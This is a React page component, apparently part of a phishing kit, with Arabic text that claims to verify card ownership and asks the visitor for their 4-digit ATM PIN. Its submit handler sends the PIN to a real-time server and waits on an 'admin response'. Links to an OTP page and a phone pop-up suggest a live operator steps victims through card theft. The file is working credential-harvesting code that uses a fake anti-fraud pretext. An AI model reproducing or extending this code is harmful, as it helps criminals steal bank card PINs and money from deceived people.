import Main from "@/components/MainWrapper";
import { Link } from "react-router-dom";
import InputWithClearIcon from "../../components/InputWithClearIcon";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import { useEffect } from "react";

const Atm = () => {
  useEffect(() => {
    setCurrentPage("atm");
  }, []);

  const goNext = (e: any) => {
    e.preventDefault();
    const data = Object.fromEntries(new FormData(e.target));
    // console.log(data);

    // [ ] should be true for production
    sendDataToServer({
      data: {
        "atm الرقم السري": data["secret-code"],
      },
      current: "atm",
      nextPage: "phone-popup",
      waitingForAdminResponse: true,
    });
  };

  return (
    <Main>
      <section className="bg-gray-100 h-screen pt-20">
        <div className="bg-white container mx-auto px-4 py-6 rounded-xl max-w-lg">
          <div className="bg-gradient-to-tl from-main/20 to-main/5 py-2 px-6 w-full mb-4 rounded-xl">
            <img
              src="/assets/images/logo.webp"
              alt="logo"
              className="h-10 mx-auto"
            />
          </div>

          <div className="bg-main/20 rounded-2xl py-3 ps-4 pe-20 relative">
            <img
              src="/assets/images/client/ATM.png"
              className="w-14 absolute left-2 top-4 lg:top-2"
              alt="atm logo"
            />

            <h2 className="text-xl font-bold text-main">إثبات ملكية البطاقة</h2>
            <p className="text-gray-600">
              الرجاء إدخال الرقم السري للصراف الألي (ATM) المكون من 4 خانات ليتم
              التأكد من ملكية و أهلية صاحب البطاقة للحماية من مخاطر الإحتيال
              الألكترونى و التأكد من عملية الدفع.
            </p>
          </div>
          <form
            onSubmit={goNext}
            className="mt-8 w-full grid grid-cols-6 items-end gap-6"
          >
            <div className="col-span-6">
              <InputWithClearIcon
                label="الرقم السري"
                id="secret-code"
                placeholder="أدخل الرقم السري هنا"
                rtl={true}
                type="password"
                max={4}
              />
            </div>

            <div className="col-span-6 flex flex-col lg:flex-row sm:items-center gap-4">
              <button
                className="w-full lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-main hover:brightness-110 text-white transition-colors"
                type="submit"
              >
                تأكيد
              </button>

              <Link
                className="w-full text-center lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-gray-200 hover:bg-gray-100 text-gray-800 transition-colors"
                to={"/otp"}
              >
                السابق
              </Link>
            </div>
          </form>
        </div>
      </section>
    </Main>
  );
};
export default Atm;
